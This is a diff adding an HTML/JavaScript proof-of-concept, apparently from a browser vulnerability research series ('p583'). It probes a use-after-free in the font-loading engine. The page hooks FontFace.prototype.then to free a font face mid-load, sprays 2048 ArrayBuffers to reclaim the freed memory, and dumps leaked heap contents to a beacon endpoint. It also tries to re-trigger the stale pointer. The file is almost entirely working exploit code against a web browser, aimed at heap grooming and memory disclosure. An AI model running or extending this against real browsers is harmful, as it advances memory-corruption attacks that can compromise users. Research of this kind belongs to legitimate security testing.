@@ -1,0 +1,145 @@
+<!--
+  p583: Relative spray neighbor characterization + re-trigger test.
+
+  Normal reclaim (2048×192B, safety fields), then:
+  A) Hit detection + full 24-qword dump + 8 neighbor signatures
+  B) Re-trigger attempt: re-add pa + new sa2 style + second load
+  C) Re-scan for changes in hit buffer and new hits
+
+  Key questions answered:
+  1. Are neighbor buffers contaminated by engine writes? (heap layout)
+  2. Can we re-trigger the face walk with a second load? (stale pointer?)
+  3. How many total buffers are hit? (multi-face check)
+
+  Expected beacons:
+    G               = start
+    F               = font freed
+    S<n>            = spray done
+    H<i>,rc=<r>,T=<hex>,W=<hex>  = hit at buffer i
+    D0/D1/D2        = hit qword dumps
+    N<±d>:<clean|DIRTY>,rc=<r>,T=<hex>,st=<d>  = neighbor
+    TH=<n>          = total hits across all 2048
+    R2              = re-trigger fired
+    RH,rc=<r>,T=<hex>,kc=<d>  = hit state post-retrigger
+    TH2=<n>         = total hits post-retrigger
+    ALIVE / ALIVE2  = survival markers
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+
+function countHits(lane,skip){
+  var n=0;
+  for(var i=0;i<lane.length;i++){
+    if(i===skip)continue;
+    var v=lane[i],rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0)n++;
+  }
+  return n;
+}
+
+function main(){
+b('G');
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+var fired=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(fired)return;fired=1;
+document.getElementById('v').remove();
+try{document.fonts.delete(this);}catch(e){}
+document.body.offsetHeight;
+b('F');
+var lane=[];
+for(var i=0;i<2048;i++)lane.push(new Uint8Array(new ArrayBuffer(192)));
+for(var j=0;j<lane.length;j++){
+  wD(lane[j],0x00,2);
+  wD(lane[j],0x60,0);
+  wD(lane[j],0x64,0xFFFFFFFF);
+  lane[j][0x82]=3;
+}
+b('S'+lane.length);
+window._l=lane;
+window._pa=pa;
+return;},set:function(){}});
+
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+// Phase A: hit + neighbors at 60ms
+setTimeout(function(){
+  var lane=window._l;if(!lane)return;
+  var hi=-1;
+  for(var i=0;i<lane.length;i++){
+    var v=lane[i],rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0){hi=i;break;}
+  }
+  if(hi<0){b('AMISS');return;}
+  window._hi=hi;
+
+  var v=lane[hi];
+  b('H'+hi+',rc='+rD(v,0)+',T='+rQ(v,0x58)+',W='+rQ(v,0x68));
+  var d='';for(var q=0;q<8;q++)d+=rQ(v,q*8)+'.';b('D0:'+d);
+  d='';for(var q=8;q<16;q++)d+=rQ(v,q*8)+'.';b('D1:'+d);
+  d='';for(var q=16;q<24;q++)d+=rQ(v,q*8)+'.';b('D2:'+d);
+
+  for(var delta=-4;delta<=4;delta++){
+    if(delta===0)continue;
+    var ni=hi+delta;
+    if(ni<0||ni>=lane.length)continue;
+    var nv=lane[ni];
+    var nrc=rD(nv,0);
+    var nT=rQ(nv,0x58);
+    var nst=nv[0x82];
+    var dirty=(nrc!==2||nT!=='0000000000000000'||nst!==3);
+    b('N'+(delta>0?'+':'')+delta+':'+(dirty?'DIRTY':'clean')+',rc='+nrc+',T='+nT+',st='+nst);
+  }
+  b('TH='+(countHits(lane,-1)+1));
+},60);
+
+// Phase B: re-trigger at 300ms
+setTimeout(function(){
+  b('R2');
+  // Re-add pa to FontFaceSet
+  try{document.fonts.add(window._pa);}catch(e){}
+  // Add a new CSS font matching same unicode range
+  var s2=document.createElement('style');
+  s2.textContent="@font-face{font-family:sa2;src:local(Arial);unicode-range:U+0042}";
+  document.head.appendChild(s2);
+  // Trigger second load — does engine re-walk the freed face?
+  document.fonts.load('1em pa, sa2','AB').then(function(){b('R2OK');},function(){b('R2FAIL');});
+},300);
+
+// Phase C: re-scan at 700ms
+setTimeout(function(){
+  var lane=window._l;if(!lane)return;
+  var hi=window._hi;if(hi===undefined){b('NOHI');return;}
+  var v=lane[hi];
+  b('RH,rc='+rD(v,0)+',T='+rQ(v,0x58)+',kc='+rD(v,0x60));
+  var th2=countHits(lane,-1)+1;
+  b('TH2='+th2);
+  // If new hits appeared, dump the second hit
+  if(th2>1){
+    for(var i=0;i<lane.length;i++){
+      if(i===hi)continue;
+      var nv=lane[i],nrc=rD(nv,0);
+      var nt=nv[0x58]|nv[0x59]|nv[0x5A]|nv[0x5B]|nv[0x5C]|nv[0x5D]|nv[0x5E]|nv[0x5F];
+      if(nrc!==2||nt){
+        b('H2='+i+',rc='+nrc+',T='+rQ(nv,0x58)+',W='+rQ(nv,0x68));
+        break;
+      }
+    }
+  }
+},700);
+
+setTimeout(function(){b('ALIVE');},500);
+setTimeout(function(){b('ALIVE2');},2000);
+}
+setTimeout(main,0);
+</script></head><body>p</body></html>
